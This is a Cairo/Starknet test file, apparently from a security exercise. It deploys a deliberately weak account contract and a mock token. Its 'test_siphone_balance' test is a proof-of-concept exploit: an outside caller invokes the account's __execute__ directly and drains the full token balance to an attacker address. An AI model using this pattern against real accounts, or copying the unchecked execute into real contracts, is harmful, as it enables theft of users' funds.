use starknet::{contract_address_const, ContractAddress,};
use starknet::account::Call;


use snforge_std::{declare, ContractClassTrait, DeclareResultTrait};


use unimpaired_cairo::erc20::erc20::{IERC20Dispatcher, IERC20DispatcherTrait};
use unimpaired_cairo::comp_account::interface::{AccountABIDispatcher, AccountABIDispatcherTrait};


fn setup() -> (ContractAddress, ContractAddress) {
    // deploy comp_account
    let account_class_hash = declare("AccountUpgradeable").unwrap().contract_class();

    let public_key: felt252 = 0x39d9e6ce352ad4530a0ef5d5a18fd3303c3606a7fa6ac5b620020ad681cc33b;

    let mut calldata = ArrayTrait::new();
    public_key.serialize(ref calldata);

    let (account_address, _) = account_class_hash.deploy(@calldata).unwrap();

    let erc20_class_hash = declare("MockERC20").unwrap().contract_class();

    let INITIAL_SUPPLY: u256 = 1000000000;
    let mut calldata = ArrayTrait::new();
    INITIAL_SUPPLY.serialize(ref calldata);
    account_address.serialize(ref calldata);

    let (erc20_contract_address, _) = erc20_class_hash.deploy(@calldata).unwrap();

    (erc20_contract_address, account_address)
}

#[test]
fn test_get_balance() {
    let INITIAL_SUPPLY: u256 = 1000000000;
    let (contract_address, account_address) = setup();
    let erc20 = IERC20Dispatcher { contract_address };

    assert(erc20.balance_of(account_address) == INITIAL_SUPPLY, 'Balance should be > 0');
}

#[test]
fn test_siphone_balance() {
    let INITIAL_SUPPLY: u256 = 1000000000;
    let (erc20_address, account_address) = setup();
    let erc20 = IERC20Dispatcher { contract_address: erc20_address };

    assert(erc20.balance_of(account_address) == INITIAL_SUPPLY, 'Balance should be > 0');

    let account_attacker_address: ContractAddress = contract_address_const::<1>();

    let account_attacker = AccountABIDispatcher { contract_address: account_address };

    let mut attack_calldata = ArrayTrait::new();
    account_attacker_address.serialize(ref attack_calldata);
    INITIAL_SUPPLY.serialize(ref attack_calldata);

    let attack_call = Call {
        to: erc20_address,
        selector: 0x0083afd3f4caedc6eebf44246fe54e38c95e3179a5ec9ea81740eca5b482d12e,
        calldata: attack_calldata.span(),
    };

    let mut calls_array = ArrayTrait::new();
    calls_array.append(attack_call);

    account_attacker.__execute__(calls_array);

    assert(erc20.balance_of(account_address) == 0_u256, 'Balance is not gone');
    assert(erc20.balance_of(account_attacker_address) == INITIAL_SUPPLY, 'Balance is not gone');
}
